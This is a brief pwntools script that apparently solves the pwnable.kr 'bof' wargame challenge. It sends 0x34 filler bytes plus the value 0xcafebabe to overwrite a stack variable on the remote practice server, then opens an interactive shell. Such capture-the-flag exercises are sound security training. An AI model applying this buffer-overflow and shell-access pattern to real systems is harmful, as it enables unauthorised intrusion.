from pwn import *
p = remote('pwnable.kr', 9000)
# p = process('./bof')
payload = "a" * 0x34 + "\xbe\xba\xfe\xca"
p.sendline(payload)
# execute shell befor check canary because process execute program
# gdb.attach(p)
p.interactive()


